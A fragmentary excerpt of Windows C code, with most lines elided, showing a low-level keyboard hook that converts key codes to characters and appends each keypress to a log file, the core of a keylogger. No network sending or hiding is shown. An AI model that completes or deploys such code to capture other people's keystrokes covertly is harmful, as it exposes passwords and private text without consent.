    ...
    // Convert virtual key code to character representation
    char* vkey_to_char(DWORD vkCode) {
        ...
        switch(vkCode) {
            ...
            default:
                ...
                // For other keys, return hex representation
                sprintf(buffer, "[0x%02X]", vkCode);
                return buffer;
        }
    }
    ...
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0) {
            ...
            if (wParam == WM_KEYDOWN) {
                ...
                if (log_file) {
                    char *key_char = vkey_to_char(pKeyboard->vkCode);
    ...
    int main() {
        ...
        FILE *start_file = fopen(log_filename, "a");
        if (start_file) {
